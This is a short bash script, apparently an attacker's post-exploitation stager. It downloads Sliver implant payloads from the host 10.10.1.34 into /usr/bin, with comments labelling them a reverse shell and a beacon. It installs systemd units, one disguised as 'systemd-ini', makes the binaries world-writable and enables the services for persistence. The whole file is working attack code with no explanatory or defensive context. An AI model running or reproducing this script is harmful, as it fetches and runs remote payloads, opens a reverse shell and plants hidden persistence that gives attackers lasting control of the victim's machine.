#!/bin/bash

#Rev shell
wget 10.10.1.34/Beachhead_source/sliverPayloads/BEAUTIFUL_APPLAUSE -O /usr/bin/start
wget 10.10.1.34/Services/worker.service -O /etc/systemd/system/worker.service

#Beacon
wget 10.10.1.34/Beachhead_source/sliverPayloads/BEAUTIFUL_APPLAUSE -O /usr/bin/sys
wget 10.10.1.34/Services/systemd-ini.service -O /etc/systemd/system/systemd-ini.service

chmod 777 /usr/bin/start
chmod 777 /usr/bin/sys

# Start services

systemctl enable worker
sleep 5
systemctl start worker &

systemctl enable systemd-ini
sleep 5
systemctl start systemd-ini &